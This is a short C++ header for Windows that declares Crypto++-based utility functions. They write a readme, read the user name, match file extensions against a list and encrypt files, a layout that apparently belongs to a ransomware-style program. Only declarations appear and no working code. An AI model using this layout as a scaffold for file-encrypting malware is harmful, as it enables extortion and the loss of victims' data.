/*
MIT License

Copyright (c) 2022 kadzicu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/


#ifndef UTILS_H_
#define UTILS_H_

#include <Windows.h>
#include <Lmcons.h>
#include <tchar.h>
#include <filesystem>
#include <vector>
#include <string>

#include <cryptopp/modes.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>

#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

#ifndef UNICODE  
typedef std::ofstream ofStream;
#else
typedef std::wofstream ofStream;
#endif

namespace Utils
{
    VOID Readme(String);
    String UserName();
    String GetFileExt(String);
    BOOL Contains(const std::vector<String>&, String);
    VOID Encrypt(CryptoPP::SecByteBlock, CryptoPP::SecByteBlock, String);
}

#endif // !UTILS_H_
